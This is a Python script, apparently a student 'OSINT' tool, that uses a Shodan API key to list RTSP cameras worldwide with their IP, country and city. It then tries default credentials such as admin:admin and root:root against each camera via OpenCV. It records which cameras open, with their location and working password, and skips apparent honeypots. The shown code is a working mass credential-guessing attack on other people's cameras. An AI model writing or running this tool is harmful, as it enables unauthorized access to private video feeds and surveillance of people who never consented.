#!/bin/env python3
import sys, os, cv2, threading
from colorama import init, Fore, Style, Back
from time import sleep
from queue import Queue
from prettytable import PrettyTable
import argparse, shodan

init()
colourtheme1, colourtheme2 = "\u001b[38;5;46m", "\u001b[38;5;50m"
warningcolour, successcolour, infocolour = "\u001b[38;5;220m", "\u001b[38;5;46m", "\u001b[38;5;39m"
errorcolour, reverse, fullreset = "\u001b[38;5;160m", "\u001b[7m", "\u001b[0m"

def clear():
    os.system('clear') if not sys.platform == "win32" else print('\n' * 100)

banner = f'''
┌───────────────────────────────────────────────────────────────────────┐
│██████╗ ██╗  ██╗██████╗ ██╗  ██╗ ██████╗ ███████╗██╗███╗   ██╗████████╗│
│██╔══██╗██║  ██║██╔══██╗██║ ██╔╝██╔═████╗██╔════╝██║████╗  ██║╚══██╔══╝│
│██║  ██║███████║██████╔╝█████╔╝ ██║██╔██║███████╗██║██╔██╗ ██║   ██║   │
│██║  ██║╚════██║██╔══██╗██╔═██╗ ████╔╝██║╚════██║██║██║╚██╗██║   ██║   │
│██████╔╝     ██║██║  ██║██║  ██╗╚██████╔╝███████║██║██║ ╚████║   ██║   │
│╚═════╝      ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   │
├────────────────────────────────────┬─────────────────┬────────────────┤
│             By C.Z3R0              │   Sec-Student   │ Version: 1.0.0 │
└────────────────────────────────────┴─────────────────┴────────────────┘
'''

clear()
print(banner)

parser = argparse.ArgumentParser(description='Find Vulnerable RTSP Cameras Around the World')
parser.add_argument('apikey', metavar='ShodanAPIkey', type=str, help='Your Shodan API Key')
parser.add_argument('-t', metavar='Threads', type=int, help='Threads to use', default=15)

reverse = ""
args = parser.parse_args()

# Define las variables de color que se usan en las funciones de impresión
fullreset = '\033[0m'
errorcolour = '\033[91m'
successcolour = '\033[92m'
warningcolour = '\033[93m'
infocolour = '\033[94m'  # Agrega esta línea para definir la variable infocolour

def warning(message):
    print(f'[{reverse}{warningcolour}!{fullreset}] {str(message)}')

def success(message):
    print(f'[{reverse}{successcolour}!{fullreset}] {str(message)}')

def info(message):
    print(f'[{reverse}{infocolour}!{fullreset}] {str(message)}')

def error(message):
    print(f'[{reverse}{errorcolour}!{fullreset}] {str(message)}')


api = shodan.Shodan(args.apikey)

try:
    info(f'Searching...')
    results = api.search('rtsp')
    success(str(len(results['matches'])) + ' Results')
except shodan.exception.APIError as e:
    error(e)
    sys.exit()

x = PrettyTable()
x.field_names = ["IP", "Domain", "Country", "City"]

for target in results['matches']:
    targetdomain = target.get("domains", [f'{errorcolour}N/A{fullreset}'])
    if len(targetdomain) > 0:
            targetdomain = targetdomain[0]
    else:
            targetdomain = f'{errorcolour}N/A{fullreset}'
    x.add_row([target["ip_str"], targetdomain, target["location"].get("country_name", ""), target["location"].get("city", "")])

print(x)

info('Starting RTSP Probing in 5 Seconds...\n')
sleep(5)
defaultcredentials = ['admin', 'root', 'admin:admin', 'admin:password', 'root:root', 'root:admin', 'admin:root']
badcams = []
allcams = []
print_lock = threading.Lock()

def tryrtsp(ip, creds):
    cap = cv2.VideoCapture(f'rtsp://{creds}@{ip}')
    ret, frame = cap.read()
    if ret == True:
        return creds
    return False

def rtspprobe(target):
    info(f'Probing {target["ip_str"]}...')
    if "honeypot" in str(target):
        rtspresult = False
    else:
        for creds in defaultcredentials:
            rtspresult = tryrtsp(target['ip_str'], creds)
            if rtspresult != False:
                badcams.append({"ip":target["ip_str"], "country":target["location"].get("country_name", ""), "city":target["location"].get("city", ""), "pass":str(creds)})
                break
        else:
            rtspresult = False
    if rtspresult == False:
        allcams.append({"ip":target["ip_str"], "country":target["location"].get("country_name", ""), "city":target["location"].get("city", "")})

